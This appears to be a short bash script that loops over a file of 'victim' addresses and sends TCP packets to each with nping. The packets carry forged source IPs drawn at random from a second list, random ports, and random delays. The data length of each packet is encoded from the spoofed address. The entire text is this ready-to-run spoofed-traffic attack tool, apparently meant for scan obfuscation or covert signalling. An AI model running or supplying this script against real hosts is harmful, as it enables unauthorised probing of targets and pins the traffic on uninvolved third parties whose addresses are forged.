for dst in $(cat victimlist.txt)
do
	for src in $(shuf iplist.txt | head -n 10)
	do
		IFS='.' read -a payload <<< "$src"
		sleep $(shuf -i 0-15 -n 1)
		nping -S $src --data-length ${payload[0]} --tcp -p$(shuf -i 1-1024 -n 1) $dst
	done
done
